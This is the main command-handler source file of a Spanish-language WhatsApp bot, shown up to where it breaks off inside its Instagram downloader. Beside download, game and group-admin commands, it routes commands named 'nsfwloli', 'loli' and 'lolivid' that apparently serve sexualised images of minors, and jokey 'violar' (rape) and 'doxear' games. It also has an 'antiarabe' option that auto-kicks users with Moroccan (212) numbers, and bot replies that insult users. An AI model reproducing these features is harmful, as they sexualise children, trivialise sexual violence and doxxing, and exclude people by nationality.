//Código desde cero y comentarios hecho por: 
// @gata_dios
// @Skidy89
// @elrebelde21 

//═════════[ Importaciones ]═════════ 
const baileys = require('@whiskeysockets/baileys'); // trabajar a través de descargas por Whatsapp 
const { WaMessageStubType, areJidsSameUser, downloadContentFromMessage, generateWAMessageContent, generateWAMessageFromContent, generateWAMessage, prepareWAMessageMedia, relayMessage} = require('@whiskeysockets/baileys'); // Importa los objetos 'makeWASocket' y 'proto' desde el módulo '@whiskeysockets/baileys'
const moment = require('moment-timezone') // Trabajar con fechas y horas en diferentes zonas horarias
const gradient = require('gradient-string') // Aplicar gradientes de color al texto
const { exec, spawn, execSync } = require("child_process")// Función 'execSync' del módulo 'child_process' para ejecutar comandos en el sistema operativo 
const chalk = require('chalk') // Estilizar el texto en la consola
const os = require('os') // Proporciona información del sistema operativo 
const fs = require('fs') // Trabajar con el sistema de archivos   
const fetch = require('node-fetch')
const axios = require('axios') 
const cheerio = require('cheerio')
const gpt = require('api-dylux')
const util = require('util')
const createHash = require('crypto') 
const mimetype = require("mime-types")  
const ws = require('ws')
const JavaScriptObfuscator = require('javascript-obfuscator')
const webp = require("node-webpmux")
const Jimp = require('jimp')
const scp1 = require('./libs/scraper') 
const { File } = require("megajs")
const speed = require("performance-now")
const ffmpeg = require("fluent-ffmpeg")
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./libs/uploader.js')
const { toAudio, toPTT, toVideo } = require('./libs/converter.js')
const { canLevelUp, xpRange } = require('./libs/levelling.js')
const { smsg, fetchBuffer, getBuffer, buffergif, getGroupAdmins, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, msToTime, downloadMediaMessage } = require('./libs/fuctions')
const { ytmp4, ytmp3, ytplay, ytplayvid } = require('./libs/youtube')
const { mediafireDl } = require('./libs/mediafire.js') 
const {jadibot, listJadibot, killJadibot} = require('./serbot.js')  
const { jadibot2 } = require('./serbot2.js')
const { menu } = require('./plugins/menu.js')
const { state, owner, grupo, instalar, ping, report, ow} = require('./plugins/info.js')
const {rob, bal, reg, work, mine, buy, afk, claim, perfil, nivel, cofre, lb} = require('./plugins/rpg.js') 
const {game, game1, game2, game3, game4, game5, game6, game7, game8, game9, game10, game11, game12, gamee} = require('./plugins/juegos.js') 
const {yt, acortar, google, imagen, tran, tts, ia, ssw} = require('./plugins/buscadores.js')
const {efec, url} = require('./plugins/convertidores.js') 
const {grup, del, join, setpp, hide, setna, setde, add, k, p, d, link, ban, tag, on, on2} = require('./plugins/grupos.js')
const {nsfw1, nsfw2, nsfw3, nsfw4, nsfw5} = require('./plugins/nsfw.js')
const {randow1, randow2, randow3, randow4, randow5} = require('./plugins/randow.js') 

const msgs = (message) => { 
if (message.length >= 10) { 
return `${message.substr(0, 500)}` 
} else { 
return `${message}`}} 
const getFileBuffer = async (mediakey, MediaType) => {  
const stream = await downloadContentFromMessage(mediakey, MediaType)  
let buffer = Buffer.from([])  
for await(const chunk of stream) {  
buffer = Buffer.concat([buffer, chunk]) }  
return buffer
}  

/**  
  * @param {proto.IWebMessageInfo.message} mek  
  * @param {proto.IWebMessageInfo} chatUpdate  
  * @param {import("@whiskeysockets/baileys").WASocket}   
*/  
module.exports = conn = async (conn, m, chatUpdate, mek, store) => {  
var budy = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
  
// ‿︵‿︵ʚɞ『 ATRIBUTOS 』ʚɞ‿︵‿︵     
if (m.key.id.startsWith("BAE5")) return  
var body = (typeof m.text == 'string' ? m.text : '') 
var _prefix = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : ""
global.prefix = _prefix
const isCmd = body.startsWith(prefix)   
const from = m.chat 
const msg = JSON.parse(JSON.stringify(mek, undefined, 2)) 
const content = JSON.stringify(m.message) 
const type = m.mtype 
const arg = body.substring(body.indexOf(' ') + 1) 
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() 
const args = body.trim().split(/ +/).slice(1) 
const q = args.join(" ") 
let t = m.messageTimestamp 
const pushname = m.pushName || "Sin nombre" 
const botnm = conn.user.id.split(":")[0] + "@s.whatsapp.net"  
const _isBot = conn.user.jid
const userSender = m.key.fromMe ? botnm : m.isGroup && m.key.participant.includes(":") ? m.key.participant.split(":")[0] + "@s.whatsapp.net" : m.key.remoteJid.includes(":") ? m.key.remoteJid.split(":")[0] + "@s.whatsapp.net" : m.key.fromMe ? botnm : m.isGroup ? m.key.participant : m.key.remoteJid  
const isCreator = global.owner.map(([numero]) => numero.replace(/[^\d\s().+:]/g, '').replace(/\s/g, '') + '@s.whatsapp.net').includes(userSender) 
const itsMe = m.sender == conn.user.id ? true : false 
const text = args.join(" ") 
const quoted = m.quoted ? m.quoted : m 
const sender = m.key.fromMe ? botnm : m.isGroup ? m.key.participant : m.key.remoteJid 
const mime = (quoted.msg || quoted).mimetype || ''  
const isMedia = /image|video|sticker|audio/.test(mime)
const mentions = []  
if (m.message[type].contextInfo) {   
if (m.message[type].contextInfo.mentionedJid) {  
const msd = m.message[type].contextInfo.mentionedJid  
for (let i = 0; i < msd.length; i++) {  
mentions.push(msd[i])}}}  
  
// ‿︵‿︵ʚɞ『 GRUPO 』ʚɞ‿︵‿︵      
const groupMetadata = m.isGroup ? await conn.groupMetadata(from) : ''
const groupName = m.isGroup ? groupMetadata.subject : '' 
const participants = m.isGroup ? await groupMetadata.participants : '' 
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : '' 
const isBotAdmins = m.isGroup ? groupAdmins.includes(botnm) : false  
const isGroupAdmins = m.isGroup ? groupAdmins.includes(userSender) : false 
const isBaneed = m.isGroup ? blockList.includes(userSender) : false 
const isPremium = m.isGroup ? premium.includes(userSender) : false   
const who = m.quoted ? m.quoted.sender : m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.jid : m.sender;
const thumb = fs.readFileSync("./media/test.jpg")
const fkontak = { "key": { "participants":"0@s.whatsapp.net", "remoteJid": "status@broadcast", "fromMe": false, "id": "Halo" }, "message": { "contactMessage": { "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${userSender.split('@')[0]}:${userSender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD` }}, "participant": "0@s.whatsapp.net" }
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: "ɴᴏᴠᴀʙᴏᴛ-ᴍᴅ", orderTitle: "sᴜᴘᴇʀ ʙᴏᴛ ᴅᴇ ᴡʜᴀᴛsᴀᴘᴘ", sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const fdoc = {key : {participant : '0@s.whatsapp.net', ...(from ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname, jpegThumbnail: null}}}
const kick = function (from, orangnya) {  
for (let i of orangnya) {  
conn.groupParticipantsUpdate(m.chat, [i], "remove")}}  
const time = moment(Number(msg.messageTimestamp + "000")).locale("es-mx").tz("America/Asuncion").format('MMMM Do YYYY, h:mm:ss a')  
  
const reply = (text) => {  
m.reply(text)} 
const sendAdMessage = (text, title, body, image, url) => { conn.sendMessage(m.chat, {text: text, contextInfo: { externalAdReply: { title: title, body: body, mediaUrl: url, sourceUrl: url, previewType: 'PHOTO', showAdAttribution: true, thumbnail: image, sourceUrl: url }}}, {})}  
const sendImage = ( image, caption ) => { conn.sendMessage(m.chat, { image: image, caption: caption }, { quoted: m })}  
const sendImageAsUrl = ( url, caption ) => { conn.sendMessage(m.chat, { image:  {url: url }, caption: caption }, { quoted: m })}  

// ‿︵‿︵ʚɞ『 TIPOS DE MENSAJES Y CITADOS 』ʚɞ‿︵‿︵  
const isAudio = type == 'audioMessage' // Mensaje de Audio  
const isSticker = type == 'stickerMessage' // Mensaje de Sticker  
const isContact = type == 'contactMessage' // Mensaje de Contacto  
const isLocation = type == 'locationMessage' // Mensaje de Localización   
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')  
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')  
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')  
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')  
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')  
const isQuotedMsg = type === 'extendedTextMessage' && content.includes('Message') // Mensaje citado de cualquier tipo  
const isViewOnce = (type === 'viewOnceMessage') // Verifica si el tipo de mensaje es (mensaje de vista única)  
  
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {userJid: conn.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
conn.ev.emit('messages.upsert', msg)}
          
//autobio
if (global.db.data.settings[numBot].autobio) {
let setting = global.db.data.settings[numBot]
if (new Date() * 1 - setting.status > 1000) {
let uptime = await runtime(process.uptime())
const bio = `ɴᴏᴠᴀʙᴏᴛ-ᴍᴅ | ᴀᴄᴛɪᴠᴏ ✅️: ${runtime(process.uptime())}\n\nᴘᴀʀᴀ ᴠᴇᴢ ᴍɪ ʟɪsᴛᴀ ᴅᴇ ᴄᴏᴍᴀɴᴅᴏ ᴜsᴀʀ #menu`
await conn.updateProfileStatus(bio)
setting.status = new Date() * 1
}} 
  
//autoread
if (m.message) {
conn.readMessages([m.key])}
            
//antifake
if (global.db.data.chats[m.chat].antifake && !isGroupAdmins) {	
if (m.chat && m.sender.startsWith('1')) return conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')}
if (global.db.data.chats[m.chat].antiarabe && !isGroupAdmins) {
if (m.chat && m.sender.startsWith('212')) return conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')}
	
//antilink
if (global.db.data.chats[m.chat].antilink) {
if (budy.match(`chat.whatsapp.com`)) {
let delet = m.key.participant
let bang = m.key.id
user = m.sender
conn.sendMessage(m.chat, {text: `\`\`\`「 ANTILINK DETECTADO 」\`\`\`\n\n@${user.split("@")[0]} eso no esta permitido necesita atencion con tu puto grupo quebrado sucia rata 🙄`, mentions: [user], },{quoted: m}) 
if (!isBotAdmins) return reply(`Te salvarte puto no soy admins 🙄`)
let gclink = (`https://chat.whatsapp.com/`+await conn.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return reply(`Te salvarte el link enviado es de este grupo`)
if (isGroupAdmins) return reply(`Te salvarte por que eres un admins :v`)
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')}}

//modo public & privado
if (!conn.public && !isCreator) {
if (!m.key.fromMe) return
}        	
//Banea chat
if (global.db.data.chats[m.chat].ban && !isCreator) {
return
}
//modoadmin
if (global.db.data.chats[m.chat].modeadmin && !isGroupAdmins) {
return
}

// Tiempo de Actividad del bot
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
//conn.sendReadReceipt(from,sender,[m.key.id])
        
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}})

// ‿︵‿︵ʚɞ『 INFO CONSOLE 』ʚɞ‿︵‿︵	
if (m.message) {
console.log(chalk.bold.cyanBright(`▣────────────···\n│${botname} ${conn.user.id == global.numBot2 ? '' : '(jadibot)'}`), 
chalk.bold.magenta('\n│⏰HORARIO: ') + chalk.magentaBright(moment(t * 1000).tz(place).format('DD/MM/YY HH:mm:ss'),
chalk.bold.red('\n️│🏷️ TAGS: ') + chalk.bold.white(`[${conn.public ? 'Publico' : 'Privado'}]`), 
chalk.bold.yellow('\n│📑TIPO (SMS): ') + chalk.yellowBright(`${type}`), 
chalk.bold.cyan('\n│📊USUARIO: ') + chalk.cyanBright(pushname) + ' ➜', gradient.rainbow(userSender), 
m.isGroup ? chalk.bold.greenBright('\n│📤GRUPO: ') + chalk.greenBright(groupName) + ' ➜ ' + gradient.rainbow(from) : chalk.bold.greenBright('\n│📥PRIVADO'), 
//chalk.bold.red('\nETIQUETA: ') + chalk.redBright(`[${isBaneed ? 'Banned' : ''}]`),
chalk.bold.white('\n│💬MENSAJE: ') + chalk.whiteBright(`\n▣────────────···\n${msgs(m.text)}\n`))
)}

//Marcar como (Escribiendo...) 
/*if (command) {
await conn.sendPresenceUpdate('composing', m.chat)
}*///Para que le guste :v

//ARRANCA LA DIVERSIÓN
switch (command) { 
case 'yts':
await yt(conn, m, text, from, command, fkontak, prefix)  
break
case 'acortar':
await acortar(conn, m, text, command)  
break
case 'google': {      
await google(conn, m, text, command)}
break 
case 'imagen': {
await imagen(conn, m, text, command)}
break
case 'traducir': case 'translate': {
await tran(conn, m, args, quoted, prefix, command)}
break
case "tts":
await tts(conn, m, q, text, quoted)
break		              				
case 'ia': case 'chatgpt':
await ia(conn, m, text, quoted)
break
case 'ss': case 'ssweb': {
await ssw(conn, m, q, prefix, command, quoted, scp1)}
break

case 'serbot': case 'qr':
await jadibot(conn, m, from, command, prefix)  
break  
case 'jadibot': case 'sercode':
jadibot2(conn, m, command, text)
break
case 'stop':
killJadibot(conn, m, prefix, command)
break
case 'bots': case 'listbots':
try { 
let user = [... new Set([...global.listJadibot.filter(conn => conn.user).map(conn => conn.user)])];
te = `*SUBBOT CONECTADO :* ${listJadibot.length}\n\n`   
for (let i of user){ 
y = await conn.decodeJid(i.id) 
te += " ❑ Usuario : @" + y.split("@")[0] + "\n" 
te += " ❑ Nombre : " + i.name + "\n\n" 
} 
conn.sendMessage(from ,{text: te, mentions: [y], },{quoted: m}) 
} catch (err) { 
reply(`*NO HAY SUBBOT CONECTADO, INTENTE MAS TARDES*`)} 
break 
                                  		
//info
case 'estado':
state(conn, m, speed, sender, fkontak) 
break
case 'menu':  
menu(conn, prefix, pushname, sender, m, fkontak)
break  
case 'owner': case 'creador': 
owner(conn, m, sender) 
break 
case 'grupos': case 'grupoficiales': 
grupo(conn, m, sender) 
break
case 'instalarbot': case 'crearbot': 
instalar(conn, m, pushname, sender) 
break
case '5492266613038': case '593980586516': case '595975740803': await ow(conn, args) 
break
case 'ping': 
ping(conn, from, msg, speed) 
break  		  
case 'report': 
report(conn, from, m, prefix, command, text)
break 

//grupo
case 'welcome': case 'audios': case 'modeadmin': case 'antifake': case 'antinternacional': case 'antiarabe': case 'detect': case 'antilink': await on(conn, m, isBotAdmins, isGroupAdmins, text, prefix, command, args)
break
case 'modojadibot': case 'anticall': case 'antiprivado': await on2(conn, m, isCreator, text, prefix, command, args)
break            
case 'grupo': grup(conn, m, args, isBotAdmins, isGroupAdmins, command, prefix, text)
break
case 'delete': case 'del': 
del(conn, m, isBotAdmins, isGroupAdmins)
break  		
case 'join': 
join(conn, m, isCreator, text, args) 
break            
case 'hidetag': case 'notificar': 
hide(conn, m, isBotAdmins, isGroupAdmins, q, participants)
break 
case 'setppname': case 'nuevonombre': case 'newnombre': 
setna(conn, m, isBotAdmins, isGroupAdmins, text)
break
case 'setdesc': case 'descripción': 
setde(conn, m, isBotAdmins, isGroupAdmins, text)
break
case 'setppgroup': case 'setpp': 
setpp(conn, m, isBotAdmins, isGroupAdmins, quoted, prefix, command, mime, args, from)
break
case 'add': case 'agregar': case 'invitar': 
add(conn, m, isBotAdmins, isGroupAdmins, text, sender, prefix)
break           
case 'kick': case 'echar':
k(conn, m, isBotAdmins, isGroupAdmins, quoted, text, sender)
break
case 'promote': 
p(conn, m, isBotAdmins, isGroupAdmins, quoted, sender)
break
case 'demote':
d(conn, m, isBotAdmins, isGroupAdmins, quoted, sender)
break            
case 'link': case 'linkgc': 
link(conn, m, isBotAdmins)
break                        		
case 'banchat': 
ban(conn, m, isBotAdmins, isGroupAdmins, text, args, prefix, command)
break             
case 'tagall': 
tag(conn, m, isBotAdmins, isGroupAdmins, participants, q)
break

//juegos
case 'simi': case 'bot': {
await game(conn, m, text, pushname, quoted)}
break 
case 'gay': { 
await game1(conn, m, participants, sender)}
break            
case 'pareja':
await game2(conn, m, pushname, participants, sender)
break
case 'fake': {
await game3(conn, text, prefix, command, body, from, m, sender, quoted)}
break
case 'follar': case 'violar':
game4(conn, m, pushname, text, sender)
break
case 'ppt':
game5(conn, m, pushname, text, sender)
break
case 'pregunta': 
game6(text, m) 
break 
case 'doxear': case 'doxxeo': 
game7(conn, pickRandom, text) 
break
case 'personalidad':
game8(conn, text, pickRandom, m) 
break
case 'slot': 
game9(conn, args, prefix, command, msToTime, m) 
break
case 'verdad':
game10(sendImageAsUrl, pickRandom)   
break   
case 'reto': 
game11(pickRandom, sendImageAsUrl)   
break                
case 'top': 
game12(conn, text, participants, pickRandom, m) 
break 
case 'topgays': case 'topotakus': 
gamee(conn, participants, command, m) 
break 
//audios 
case "a": 
if (!global.db.data.chats[m.chat].audios) return
let vn = './media/a.mp3'
await conn.sendPresenceUpdate('recording', m.chat)
conn.sendMessage(m.chat, { audio: { url: vn }, contextInfo: { "externalAdReply": { "title": botname, "body": ``, "previewType": "PHOTO", "thumbnailUrl": null,"thumbnail": imagen1, "sourceUrl": md, "showAdAttribution": true}}, seconds: '4556', ptt: true, mimetype: 'audio/mpeg', fileName: `error.mp3` }, { quoted: m }) 
break
//convertidores
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel': 
efec(conn, command, mime, quoted, exec, prefix, m, from) 
break   
case 'tourl': 
url(conn, mime, quoted, util, m) 
break
//nsfw
case 'hentai': 
await nsfw1(conn, m, pickRandom)
break
case 'nsfwloli': 
await nsfw2(conn, m, pickRandom)
break
case 'lewd': case 'feed': case 'gasm': case 'anal': case 'holo': case 'tits': case 'kuni': case 'kiss': case 'erok': case 'smug': case 'solog': case 'feetg': case 'lewdk': case 'waifu': case 'pussy': case 'femdom': case 'cuddle': case 'eroyuri': case 'cum_jpg': case 'blowjob': case 'holoero': case 'erokemo': case 'fox_girl': case 'futanari': case 'wallpaper':
await nsfw3(conn, m, pickRandom, sendImageAsUrl, command)
break
case 'hentai2':
nsfw4(sendImageAsUrl, m) 
break
case 'porno':
nsfw5(sendImageAsUrl, m) 
break
//randow
case 'memes':
await randow1(sendImageAsUrl, m)
break
case 'loli': 
await randow2(sendImageAsUrl, m, pickRandom)
break
case 'lolivid':
await randow3(conn, m, pickRandom)
break
case 'neko':
await randow4(sendImageAsUrl, m, pickRandom)
break
case 'akira': case 'akiyama': case 'anna': case 'asuna': case 'ayuzawa': case 'boruto': case 'chiho': case 'chitoge': case 'deidara': case 'erza': case 'elaina': case 'eba': case 'emilia': case 'hestia': case 'hinata': case 'inori': case 'isuzu': case 'itachi': case 'itori': case 'kaga': case 'kagura': case 'kaori': case 'keneki': case 'kotori': case 'kurumi': case 'madara': case 'mikasa': case 'miku': case 'minato': case 'naruto': case 'nezuko': case 'sagiri': case 'sasuke': case 'sakura': case 'cosplay':
await randow5(sendImageAsUrl, command, pickRandom, m)
break 
case 'blackpink':  
sendImageAsUrl("https://delirius-image-random.vercel.app/api/all");
break 
//descargas		    
case 'play': case 'play2': {
if (global.db.data.users[m.sender].registered < true) return reply(info.registra)
if (!text) return conn.sendMessage(from, { text: `*ingrese nombre de alguna cancion*` }, { quoted: msg })
let yts = require("youtube-yts")
let search = await yts(text)
let anup3k = search.videos[0]
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
conn.sendMessage(from, { image : eek, caption:  `╭───≪~*╌◌ᰱ•••⃙❨͟͞P̸͟͞L̸͟A̸͟͞Y̸͟͞❩⃘•••ᰱ◌╌*~*
│║📌 *Título* : ${anu.title}
│║📆 *Publicado:* ${anu.ago}
│║⌚ *Duración:* ${anu.timestamp}
│║👤 *Autor:* ${anu.author.name}
│║👀 *Vistas:*  ${anu.views}
│║
│║  *si quiere descarga el video usar:*
│║ #ytvideo ${anu.url}
╰─•┈┈┈•••✦𝒟ℳ✦•••┈┈┈•─╯⟤` }, { quoted: m})
const playmp3 = require('./libs/ytdl2')
const pl= await playmp3.mp3(anup3k.url)
await conn.sendMessage(from, { audio: fs.readFileSync(pl.path), fileName: `error.mp3`, mimetype: 'audio/mp4' }, { quoted: m }); 
await fs.unlinkSync(pl.path)
db.data.users[m.sender].limit -= 1
reply(info.limit)}
break
case "ytmp3": case "ytaudio": 
const mp = require('./libs/ytdl2')
if (args.length < 1 || !isUrl(text) || !mp.isYTUrl(text)) return reply(`*Ejemplo:*\n${prefix + command} https://youtu.be/7ouFkoU8Ap8?si=Bvm3LypvU_uGv0bw`)
conn.sendMessage(from, { text: `*Aguarde un momento*\n\nᴱˡ ᴬᵘᵈᶦᵒ ᵖᵘᵉᵈᵉ ᵗᵃʳᵈᵃ ᵉⁿᵗʳᵉ ⁵ ᵒ ¹⁰ ᵐᶦⁿᵘᵗᵒˢ ᵉˡ ᵉⁿᵛᶦᵃˢᵉ ᵗᵉⁿᵈʳᵃ́ ᵖᵃᶜᶦᵉⁿᶜᶦᵃ` }, { quoted: fdoc });    
let mediaa = await ytplayvid(text)
const audio = await mp.mp3(text)
await conn.sendMessage(from, {audio: fs.readFileSync(audio.path), mimetype: 'audio/mp4',
contextInfo: {
externalAdReply: { title:audio.meta.title,
body: botname,
//await getBuffer(pl.meta.image),
thumbnail: getBuffer(audio.meta.image), 
mediaType:2,
mediaUrl:text,
}}}, {quoted:m}) 
await fs.unlinkSync(audio.path)
db.data.users[m.sender].limit -= 1
reply(info.limit) 
break 
case 'ytmp4': case 'ytvideo': {
const mp = require('./libs/ytdl2')
if (args.length < 1 || !isUrl(text) || !mp.isYTUrl(text)) return reply(`*Que esta buscado?*\n\n*Ejemplo:*\n${prefix + command} https://youtu.be/7ouFkoU8Ap8?si=Bvm3LypvU_uGv0bw`)
conn.sendMessage(from, { text: `*Aguarde un momento*\n\nᴱˡ ᵛᶦᵈᵉᵒ ᵖᵘᵉᵈᵉ ᵗᵃʳᵈᵃ ᵉⁿᵗʳᵉ ⁵ ᵒ ¹⁰ ᵐᶦⁿᵘᵗᵒˢ ᵉˡ ᵉⁿᵛᶦᵃˢᵉ ᵗᵉⁿᵈʳᵃ́ ᵖᵃᶜᶦᵉⁿᶜᶦᵃ` }, { quoted: fdoc });    
const vid = await mp.mp4(text)
const ytc = `*❏ Título :* ${vid.title} 
*❏ Duración :* ${vid.duration}
*❏ Subido :* ${vid.date}
*❏ calidad :* ${vid.quality}`
await conn.sendMessage(from, {video: {url : vid.videoUrl}, caption: ytc }, {quoted:m})
db.data.users[m.sender].limit -= 1
reply(info.limit)}
break   
case 'gitclone':
if (global.db.data.users[m.sender].registered < true) return reply(info.registra)
if (!args[0]) return reply(`*Ejemplo :*\n${prefix + command} ${md}`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalido!!`)
conn.sendMessage(from, { text: `*𝘈𝘎𝘜𝘈𝘙𝘋𝘌 𝘜𝘕 𝘔𝘖𝘔𝘌𝘕𝘛𝘖...*\n\nˢᶦ ᵉˡ ᵃʳᶜʰᶦᵛᵒ ⁿᵒ ˡˡᵉᵍᵃ ᵉˢ ᵠᵘᵉ ʳᵉᵖᵒˢᶦᵗᵒʳᶦᵒ ᵉˢ ᵐᵘʸ ᵖᵉˢᵃᵈᵒ` }, { quoted: m })
try {
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
conn.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(info.error))
db.data.users[m.sender].limit -= 1
reply(info.limit) 
} catch {
reply(info.error)}
break
case 'tiktok':
if (global.db.data.users[m.sender].registered < true) return reply(info.registra)
if (!text) return m.reply( `*Ejemplo:* ${prefix + command} https://vm.tiktok.com/ZMjdrFCtg/`)
if (!q.includes('tiktok')) return m.reply(`*link invalido!*`)
//await loading ()
conn.fakeReply(m.chat, `⏳ *Aguarde un momento....*`, '0@s.whatsapp.net', 'No haga spam')
try {
require('./libs/tiktok').Tiktok(q).then( data => {
conn.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: m })
conn.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })})
db.data.users[m.sender].limit -= 1
reply(info.limit) 
} catch {
reply(info.error)}
break
case 'lyrics': case 'letra': {
if (global.db.data.users[m.sender].registered < true) return reply(info.registra)
if (!text) return reply(`*Que esta buscado? ingresa el titulo/nombre de la canción*\n*Ejemplo:* ${prefix + command} ozuna`)
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
conn.editMessage(m.chat, '*Aguarde un momento....*', `*❏ Titulo:* ${result.title}\n*❏ Autor :* ${result.author}\n*❏ Url :* ${result.link}\n\n*❏ Letra :* ${result.lyrics}`, 3, fkontak)
db.data.users[m.sender].limit -= 1
reply(info.limit)}
break
case 'mediafire': {
if (global.db.data.users[m.sender].registered < true) return reply(info.registra)
if (!text) return reply(`*Ejemplo:*\n${prefix + command} https://www.mediafire.com/file/admrdma1ff3cq10/Siete-Ocho.zip/file`) 
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 1500) return reply('No puedo descarga el archivo supera el limite 900 MB ' + util.format(baby1))
const result4 = `╭━─━─━─≪💎≫─━─━─━╮
┆      *MEDIAFIRE*
┆——————«•»——————
┆🔸️ *Nombre:* ${baby1[0].nama} 
┆——————«•»——————
┆🔸️ *Tamaño:* ${baby1[0].size} 
┆——————«•»——————
┆🔸️ *Extension:* ${baby1[0].mime}
╰━─━─━─≪💎≫─━─━─━╯\n\n_Descargo archivo aguarde un momento...._  ` 
 reply(`${result4}`) 
 conn.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime ,  quoted : m, contextInfo: { externalAdReply:{ 
   title: botname, 
   body:"💫", 
   showAdAttribution: true, 
   mediaType:2, 
   thumbnail: fs.readFileSync(`./media/menu.jpg`) , 
   mediaUrl: md,  
 sourceUrl: md }}}, {quoted: m})
 db.data.users[m.sender].limit -= 2
reply(info.limit)}
 break 
 case 'igstalk': {
if (!args[0]) return reply(`*Ingrese el nombre del usuario*\n\n*Ejemplo:* ${prefix + command} Emilia`)
const fg = require('api-dylux')
try {
let res = await fg.igStalk(args[0])
let te = `╭━─━─━─≪≫─━─━─━╮
│ ≡  *STALKING* 
│——————«•»——————
│🔸 *🔖Nombre:* ${res.name} 
│🔸 *🔖Username:* ${res.username}
│🔸 *👥Seguidores:* ${res.followersH}
│🔸 *🫂Siguiendo:* ${res.followingH}
│🔸 *📌Bio:* ${res.description}
│🔸 *🏝️Posts:* ${res.postsH}
│——————«•»——————
│🔸 *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
╰━─━─━─≪≫─━─━─━╯`
await conn.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
} catch {
reply(info.error)}}
break
case 'facebook':
if (!text) return reply(`*Ejemplo:* ${prefix + command} link`)
conn.fakeReply(m.chat, `⏳ *Aguarde un momento....*`, '0@s.whatsapp.net', 'No haga spam')
try {
const Rres = await fetch(`https://api.lolhuman.xyz/api/facebook?apikey=${lolkeysapi}&url=${args[0]}`);
const Jjson = await Rres.json();
let VIDEO = Jjson.result[0];
if (VIDEO == '' || !VIDEO || VIDEO == null) VIDEO = Jjson.result[1];
conn.sendMessage(m.chat, {video: {url: VIDEO}, caption: `*🎥 AQUI ESTA TU VIDEO DE FACEBOOK*`}, {quoted: m})
} catch {
reply(info.error)}
break
case 'instagram':
if (!text) return reply(`*Ejemplo:* ${prefix + command} link`)
